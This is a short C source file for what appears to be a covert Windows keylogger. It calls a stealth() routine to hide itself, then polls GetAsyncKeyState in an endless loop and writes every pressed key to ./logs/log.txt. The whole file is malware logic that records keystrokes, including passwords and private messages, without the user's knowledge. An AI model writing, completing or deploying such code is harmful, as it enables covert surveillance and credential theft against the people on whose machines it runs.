#include "funcs.h"
#include <unistd.h>
#define true 1

int main(int argc, char** argv)
{
    stealth();
    mkdir("logs");

    char* path = "./logs/log.txt";

    while(true) for(int i = 0; i < 191; i++)
    if(GetAsyncKeyState(i) == -32767) save(i, path);

    return 0;
}